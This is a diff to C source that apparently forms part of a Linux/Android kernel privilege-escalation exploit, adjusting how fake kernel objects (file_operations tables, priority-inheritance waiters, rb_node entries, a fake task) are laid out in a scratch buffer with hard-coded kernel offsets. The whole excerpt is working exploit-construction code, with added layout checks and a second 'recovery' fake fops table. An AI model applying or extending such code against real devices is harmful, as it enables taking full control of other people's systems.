@@ -8,6 +8,21 @@
 
 #include "04_fake_kernel_objects.h"
 
+_Static_assert(OSS_PRIMARY_FOPS_BUFFER_OFFSET -
+                       OSS_PRIMARY_FOPS_LIVE_OFFSET ==
+                   0xe80,
+               "primary FOPS D-to-A translation mismatch");
+_Static_assert(OSS_RECOVERY_FOPS_BUFFER_OFFSET -
+                       OSS_RECOVERY_FOPS_LIVE_OFFSET ==
+                   0xe80,
+               "recovery FOPS D-to-A translation mismatch");
+_Static_assert(OSS_PRIMARY_FOPS_BUFFER_OFFSET +
+                       OSS_FAKE_FOPS_POPULATED_SIZE <=
+                   0x2210,
+               "primary FOPS overlaps fake lock");
+_Static_assert(0x2350 + 0x58 <= OSS_RECOVERY_FOPS_BUFFER_OFFSET,
+               "recovery FOPS overlaps fake waiter");
+
 static void put64(unsigned char *base, size_t off, uint64_t value) {
   memcpy(base + off, &value, sizeof(value));
 }
@@ -76,7 +91,7 @@ void build_fops_install_object(unsigned char *scratch, uint64_t aligned_base,
 
   uint64_t lock_waiters_self_ref = aligned_base | 0x14d0ULL;
   uint64_t pi_waiters_self_ref = aligned_base | 0x14e8ULL;
-  uint64_t pi_parent = aligned_base | 0x1180ULL;
+  uint64_t pi_parent = aligned_base | OSS_PRIMARY_FOPS_LIVE_OFFSET;
   uint64_t waiter_lock = aligned_base | 0x1390ULL;
   uint64_t root_task_group = kernel_base + 0x02cb9ac0ULL;
 
@@ -88,12 +103,15 @@ void build_fops_install_object(unsigned char *scratch, uint64_t aligned_base,
   put_fake_waiter(scratch, 0x2350, pi_parent, ashmem_misc_fops_addr, 0,
                   init_task_addr, waiter_lock, 0x82);
 
-  put_fake_fops(scratch, kernel_base, pi_waiters_self_ref, 0x2000);
+  put_fake_fops(scratch, kernel_base, pi_waiters_self_ref,
+                OSS_PRIMARY_FOPS_BUFFER_OFFSET);
+  put_fake_fops(scratch, kernel_base, pi_waiters_self_ref,
+                OSS_RECOVERY_FOPS_BUFFER_OFFSET);
   put_fake_task(scratch, pi_waiters_self_ref, root_task_group, init_task_addr);
 
   /* RIGHT_OFF / LEFT_OFF: two more fake rb_node objects, both parented
-   * back at pi_parent (aligned_base|0x1180) -- same value used above for
-   * the waiter's pi_tree_entry.parent_color. */
+   * back at pi_parent (aligned_base|OSS_PRIMARY_FOPS_LIVE_OFFSET) -- the
+   * same value used above for the waiter's pi_tree_entry.parent_color. */
   put64(scratch, 0x4440, pi_parent);
   put64(scratch, 0x4448, 0);
   put64(scratch, 0x4450, 0);
